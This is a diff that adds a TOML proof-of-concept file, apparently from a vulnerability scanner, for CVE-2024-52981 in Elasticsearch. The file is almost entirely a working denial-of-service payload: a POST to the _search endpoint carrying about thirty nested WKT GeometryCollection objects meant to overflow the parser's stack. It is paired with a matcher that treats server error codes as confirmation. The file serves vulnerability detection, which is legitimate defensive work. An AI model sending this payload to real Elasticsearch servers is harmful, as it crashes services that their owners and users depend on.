@@ -1,0 +1,35 @@
+[info]
+author = "AVE"
+description = "通过向 Elasticsearch 发送包含深度嵌套 GeometryCollection 对象的 Well-Known Text 格式查询，触发递归解析导致堆栈溢出，验证服务拒绝漏洞"
+id = "POC-AVE-2024-0551"
+name = "CVE-2024-52981 PoC"
+severity = "medium"
+tags = ["ave-2024-0551"]
+vuln_id = [
+    "CVE-2024-52981",
+    "AVE-2024-0551",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/_search"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"query":{"geo_shape":{"location":{"shape":"GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(GEOMETRYCOLLECTION(POINT(1 1))))))))))))))))))))))))))))))","relation":"within"}}}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+]
+type = "status"
